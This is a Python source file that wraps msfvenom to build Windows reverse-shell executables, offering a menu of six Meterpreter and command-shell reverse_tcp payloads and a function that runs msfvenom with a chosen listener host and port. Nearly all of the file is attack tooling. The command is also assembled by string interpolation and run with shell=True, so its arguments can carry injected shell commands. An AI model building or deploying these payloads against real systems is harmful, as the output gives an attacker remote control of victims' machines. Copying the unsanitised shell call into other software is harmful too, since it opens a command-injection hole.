import subprocess
import os
import shutil

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
OUTPUT_DIR = os.path.join(ROOT, "output")

PAYLOADS = {
    "1": {
        "name": "windows/x64/meterpreter/reverse_tcp",
        "desc": "x64 Meterpreter reverse TCP (Windows 64-bit)",
        "arch": "x64",
        "fmt": "exe"
    },
    "2": {
        "name": "windows/meterpreter/reverse_tcp",
        "desc": "x86 Meterpreter reverse TCP (Windows 32-bit)",
        "arch": "x86",
        "fmt": "exe"
    },
    "3": {
        "name": "windows/x64/meterpreter_reverse_tcp",
        "desc": "x64 Stageless Meterpreter reverse TCP",
        "arch": "x64",
        "fmt": "exe"
    },
    "4": {
        "name": "windows/meterpreter_reverse_tcp",
        "desc": "x86 Stageless Meterpreter reverse TCP",
        "arch": "x86",
        "fmt": "exe"
    },
    "5": {
        "name": "windows/x64/shell_reverse_tcp",
        "desc": "x64 Stageless Shell reverse TCP",
        "arch": "x64",
        "fmt": "exe"
    },
    "6": {
        "name": "windows/shell_reverse_tcp",
        "desc": "x86 Stageless Shell reverse TCP",
        "arch": "x86",
        "fmt": "exe"
    }
}

def list_payloads():
    print("\n[ PAYLOADS AVAILABLE ]")
    print(f"{'ID':<4} {'Payload':<45} {'Desc'}")
    print("-" * 75)
    for k, v in PAYLOADS.items():
        print(f" {k:<2}  {v['name']:<45} {v['desc']}")
    print()

def build_payload(payload_id, lhost, lport, output_name="payload.exe"):
    if payload_id not in PAYLOADS:
        print("[x] Invalid payload ID")
        return None

    p = PAYLOADS[payload_id]
    arch_flag = "" if p["arch"] == "x86" else " ARCH=x64"

    os.makedirs(OUTPUT_DIR, exist_ok=True)
    out_path = os.path.join(OUTPUT_DIR, output_name)

    cmd = (
        f"msfvenom -p {p['name']} LHOST={lhost} LPORT={lport}"
        f"{arch_flag} -f {p['fmt']} -o \"{out_path}\""
    )

    print(f"[*] Building payload: {p['name']}")
    print(f"[*] LHOST={lhost} LPORT={lport}")
    print(f"[*] Command: {cmd}")

    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[x] msfvenom failed:\n{result.stderr}")
        return None

    if os.path.exists(out_path) and os.path.getsize(out_path) > 500:
        kb = os.path.getsize(out_path) / 1024
        print(f"[+] Payload created: {out_path} ({kb:.1f} KB)")
        return out_path
    else:
        print("[x] Payload file too small or missing")
        return None
